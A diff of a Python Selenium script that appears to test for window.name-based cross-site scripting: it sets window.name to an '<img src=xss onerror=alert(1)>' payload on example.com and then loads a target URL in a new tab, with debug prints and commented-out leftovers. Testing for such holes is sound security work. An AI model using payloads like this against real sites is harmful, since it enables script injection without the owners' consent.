@@ -25,18 +25,22 @@ def process_payload(url_path, abs_path):
     options.add_argument("--enable-logging")
     driver = webdriver.Chrome('./chromedriver', options=options)
 
-
-    driver.get(url_path)
-    original = driver.current_window_handle
-    driver.switch_to.new_window('tab')
-    new = driver.current_window_handle
-
     driver.get('https://www.example.com')
-
+    original = driver.current_window_handle
     payload = '<img src=xss onerror=alert(1)>'
     print('te')
     driver.execute_script(f"window.name = '{payload}';")
     print('te')
+    driver.switch_to.new_window('tab')
+    driver.get(url_path)
+    driver.switch_to.window(original)
+
+    # driver.get('https://www.example.com')
+
+    # payload = '<img src=xss onerror=alert(1)>'
+    # print('te')
+    # driver.execute_script(f"window.name = '{payload}';")
+    # print('te')
 
 
     # driver.switch_to.window(original)
